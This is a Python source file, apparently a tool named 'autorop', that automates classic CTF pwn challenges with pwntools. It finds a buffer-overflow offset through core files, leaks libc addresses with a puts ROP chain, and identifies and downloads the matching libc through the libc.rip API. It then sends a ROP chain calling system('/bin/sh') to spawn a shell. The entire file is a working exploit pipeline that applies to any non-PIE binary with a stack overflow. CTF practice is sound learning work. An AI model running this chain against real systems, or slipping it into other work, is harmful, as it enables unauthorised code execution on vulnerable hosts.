#!/usr/bin/env python3
# autorop - automated solver of classic CTF pwn challenges, with flexibility in mind

from pwn import *

# make mypy happy by explicitly importing what we use
from pwn import tube, ELF, ROP, context, cyclic, cyclic_find, pack, log, process, unpack
import requests

from dataclasses import dataclass
from typing import Callable, Dict, List, Optional
from functools import reduce

CLEAN_TIME = 1  # pwntools tube.clean(CLEAN_TIME), for removed excess output


class PwnState:
    """Class for keeping track of our exploit development."""

    def __init__(self, binary_name: str, target: tube, vuln_function: str = "main"):
        self.binary_name = binary_name  # path to binary
        self.target = target  # tube pointing to the victim to exploit
        self.vuln_function = vuln_function  # name of vulnerable function in binary,
        # to return to repeatedly
        self.elf: ELF = ELF(self.binary_name)  # pwntools ELF of binary_name
        self.libc: Optional[ELF] = None  # ELF of target's libc
        # offset to return address via buffer overflow
        self.bof_ret_offset: Optional[int] = None
        # function which write rop chain to the "right place" (usually return address)
        self.overwriter: Optional[Callable[[tube, bytes], None]] = None
        self.leaks: Dict[str, int] = {}  # leaked symbols

        # set pwntools' context appropriately
        context.binary = self.binary_name  # set architecture etc. automagically
        context.cyclic_size = context.bits / 8

    def __repr__(self) -> str:
        return f"<PwnState {str(vars(self))}>"


def util_addressify(data: bytes) -> int:
    """Produce the address from a data leak."""
    result: int = unpack(data[: context.bits // 8].ljust(context.bits // 8, b"\x00"))
    return result


def util_debug_requests(r: requests.Response) -> None:
    """Print debugging information on a HTTP response."""
    log.debug(r.request.headers)
    log.debug(r.request.body)
    log.debug(r.headers)
    # log.debug(r.content)  # often too big


def util_call_overwriter(state: PwnState, data: bytes) -> None:
    """Call `state.overwriter`, logging as necessary."""
    assert state.overwriter is not None  # make mypy happy
    state.overwriter(state.target, data)


def bof_corefile(state: PwnState) -> PwnState:
    """Find the offset to the return address via buffer overflow.

    This function not only finds the offset from the input to the return address
    on the stack, but also sets `overwriter` to be a function that correctly
    overwrites starting at the return address"""
    CYCLIC_SIZE = 1024
    if state.bof_ret_offset is None:
        # cause crash and find offset via corefile
        p: tube = process(state.binary_name)
        p.sendline(cyclic(CYCLIC_SIZE))
        p.wait()
        fault: int = p.corefile.fault_addr
        log.info("Fault address @ " + hex(fault))
        state.bof_ret_offset = cyclic_find(pack(fault))
    log.info("Offset to return address is " + str(state.bof_ret_offset))

    # define overwriter as expected - to write data starting at return address
    def overwriter(t: tube, data: bytes) -> None:
        t.sendline(cyclic(state.bof_ret_offset) + data)

    state.overwriter = overwriter
    return state


def leak_puts(state: PwnState) -> PwnState:
    """Leak libc addresses using `puts`.

    This function leaks the libc addresses of `__libc_start_main` and `puts`
    using `puts`, placing them in `state.leaks`.
    It expects the `state.overwriter` is set."""
    LEAK_FUNCS = ["__libc_start_main", "puts"]
    rop = ROP(state.elf)
    for func in LEAK_FUNCS:
        rop.puts(state.elf.got["__libc_start_main"])
        rop.puts(state.elf.got["puts"])
    rop.call(state.vuln_function)  # return back so we can execute more chains later
    log.info(rop.dump())

    state.target.clean(CLEAN_TIME)
    util_call_overwriter(state, rop.chain())

    for func in LEAK_FUNCS:
        line = state.target.readline()
        log.debug(line)
        # remove last character which must be newline
        state.leaks[func] = util_addressify(line[:-1])
        log.info(f"leaked {func} @ " + hex(state.leaks[func]))

    return state


def libc_rip(state: PwnState) -> PwnState:
    """Acquire libc version using libc.rip.

    We can programmatically find and download libc based on leaks
    (two or more preferred). This function sets `state.libc`, including setting
    `state.libc.address` for ready-to-use address calculation.
    We expect some leaks in `state.leaks` beforehand."""
    URL = "https://libc.rip/api/find"
    LIBC_FILE = ".autorop.libc"
    formatted_leaks: Dict[str, str] = {}
    for symbol, address in state.leaks.items():
        formatted_leaks[symbol] = hex(address)

    log.info("Searching for libc based on leaks")
    r = requests.post(URL, json={"symbols": formatted_leaks})
    util_debug_requests(r)
    json = r.json()
    log.debug(json)
    if len(json) == 0:
        log.error("could not find any matching libc!")
    if len(json) > 1:
        log.warning(f"{len(json)} matching libc's found, picking first one")

    log.info("Downloading libc")
    r = requests.get(json[0]["download_url"])
    util_debug_requests(r)
    with open(LIBC_FILE, "wb") as f:
        f.write(r.content)

    state.libc = ELF(LIBC_FILE)
    # pick first leak and use that to calculate base
    some_symbol, its_address = next(iter(state.leaks.items()))
    state.libc.address = its_address - state.libc.symbols[some_symbol]

    # sanity check
    for symbol, address in state.leaks.items():
        diff = address - state.libc.symbols[symbol]
        if diff != 0:
            log.warning(f"symbol {symbol} has delta with actual libc of {hex(diff)}")

    return state


def call_system_binsh(state: PwnState) -> PwnState:
    """Call `system("/bin/sh")` via a ROP chain.

    Call `system("/bin/sh")` using a ROP chain built from `state.libc` and
    written by `state.overwriter`."""
    rop = ROP([state.elf, state.libc])
    assert state.libc is not None
    rop.system(next(state.libc.search(b"/bin/sh\x00")))
    rop.call(state.vuln_function)  # just in case, to allow for further exploitation
    log.info(rop.dump())

    util_call_overwriter(state, rop.chain())

    return state


def pipeline(state: PwnState, *funcs: Callable[[PwnState], PwnState]) -> PwnState:
    """Pass the PwnState through a "pipeline", sequentially executing each given function."""

    with log.progress("Pipeline") as progress:

        def reducer(state: PwnState, func: Callable[[PwnState], PwnState]) -> PwnState:
            log.debug(state)
            progress.status(func.__name__)
            return func(state)

        return reduce(reducer, funcs, state)


def classic(state: PwnState) -> PwnState:
    """Perform an attack against a non-PIE buffer-overflowable binary."""
    return pipeline(state, bof_corefile, leak_puts, libc_rip, call_system_binsh)
